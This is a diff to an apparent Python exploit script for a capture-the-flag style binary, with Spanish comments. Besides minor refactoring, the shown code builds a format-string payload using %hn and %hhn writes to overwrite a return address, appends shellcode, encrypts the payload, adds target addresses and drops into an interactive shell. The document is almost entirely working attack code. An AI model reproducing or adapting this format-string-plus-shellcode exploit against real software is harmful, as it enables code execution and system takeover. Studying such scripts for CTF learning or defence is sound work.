@@ -108,6 +108,12 @@ def leak_addr(addr):
     leak = leak + '\x00' * (8 - len(leak))
     return u64(leak)
 
+def pad(p):
+    pad = len(p) % 8
+    if pad > 0:
+        p += ' ' * (8 - pad)
+    return p
+
 def main():
     recvuntil('> ')
     setkey()
@@ -120,16 +126,13 @@ def main():
 
     # en ret_addr sobreescribo 0x40140a por 0x602580
     payload  = ''
-    payload += '%37x'  # 0x25
-    payload += '%70$hn' # byte del medio
-    payload += '%59x'  # 0x60
-    payload += '%71$hn' # MSF
-    payload += '%32x'  # 0x80
+    payload += '%37x'    # 0x25
+    payload += '%70$hn'  # byte del medio
+    payload += '%59x'    # 0x60
+    payload += '%71$hn'  # MSF
+    payload += '%32x'    # 0x80
     payload += '%69$hhn' # LSB
-    pad = len(payload) % 8
-    if pad > 0:
-        payload += ' ' * (8 - pad)
-
+    payload  = pad(payload)
     payload += shellcode
 
     payload  = encrypt(payload)[:-1]
@@ -138,7 +141,8 @@ def main():
     payload += p64(ret_addr + 1) # byte del medio
     payload += p64(ret_addr + 2) # MSB
 
-    print decrypt(payload)
+    decrypt(payload)
+
     interactive()
 
 if __name__ == '__main__':
